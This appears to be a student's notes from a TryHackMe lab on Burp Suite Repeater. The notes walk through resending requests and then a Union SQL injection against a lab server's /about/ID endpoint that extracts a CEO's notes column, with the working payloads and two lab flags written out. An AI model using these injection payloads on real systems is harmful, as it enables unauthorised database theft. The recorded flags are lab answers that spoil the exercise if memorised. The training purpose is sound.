#BurpSuite 

You will learn how to manipulate and resend captured requests, and we will explore the various options and functionalities available in this exceptional module.

Burp Suite Repeater enables us to modify and resend intercepted requests to a target of our choosing

The ability to edit and resend requests multiple times makes Repeater invaluable for manual exploration and testing of endpoints.

`CTRL + R` shortcut 

right click on captured packet > send to Repeater > Send > loads Response
- now can edit the response

```
REQUEST
GET / HTTP/1.1
Host: x.x.x.x
User-Agent: 
...
Connection: close      ~~ change to open > Send 

------------
RESPONSE
HTTP/ 1.1 200 OK
...
Connection: keep-alive

```


Message Analysis toolbar
- pretty (default) 
- raw raw response from server (no formatting)
- hex = byte level representation , useful for binary files
- render = visualize the page as if in browser 

Inspector 
- the box on right side of Repeater

`10.10.125.187`
`http://10.10.125.187` 
capture request in Proxy > send to Repeater
Send 1x from Repeater > see the HTML code 

using Inspector or manually ass a header `FlagAuthorised: True` 
- ` THM{Yzg2MWI2ZDhlYzdlNGFiZTUzZTIzMzVi} `

disable proxy
go to ` http://10.10.125.187/products/  `
click on See More
endpoint is `/products/3`

turn on proxy intercept and iterate the endpoint numbers
`/products/-1`  is extreme since iterating to 100 = 404 error

#### Challenge Objective

Your objective in this challenge is to identify and exploit a Union SQL Injection vulnerability present in the ID parameter of the `/about/ID` endpoint. By leveraging this vulnerability, your task is to launch an attack to retrieve the notes about the CEO stored in the database.

`http://10.10.129.249/about/2`
captured > Repeater > Send > Response

```
REQUEST
GET /about/2 HTTP/1.1
Host: 10.10.129.249
...

```

Now test if vulnerability exists
- `GET /about/2' HTTP/1.1`  and send = 500 internal server error
- look at Response window, line 40 `Invalid statement`
```
<code>
  Invalid statement: 
  <code>
  SELECT firstName, lastName, pfpLink, role, bio 
  FROM people 
  WHERE id = 2'
  </code>
</code>
```

this is helpful error message that the server should not be sending 
- DB table we are selecting  `FROM people`  
- the query has 5 columns `firstName, lastName, pfpLink, role, bio`
- we can use a UNION call 
- `/about/0 UNION ALL SELECT column_name,null,null,null,null FROM information_schema.columns WHERE table_name="people" `
- this changes the id to 0, creates a union query , 4 null columns to avoid errors

```
GET /about/0 UNION ALL SELECT group_concat(column_name),null,null,null,null FROM information_schema.columns WHERE table_name="people" HTTP/1.1
```

this returns `About | id,firstname,lastname,pfpLink,role,shortRole,bio,notes None`

we want the `notes` column
- name of table `people`
- name of target column `notes`
- ID of CEO is `1`  (found by Jameson Wolfe's profile on /about/ page checking ID in url)

```
GET /about/0 UNION ALL SELECT notes,null,null,null,null FROM people WHERE id=1 HTTP/1.1
```

this Response returns the flag
- ` THM{ZGE3OTUyZGMyMzkwNjJmZjg3Mzk1NjJh} `
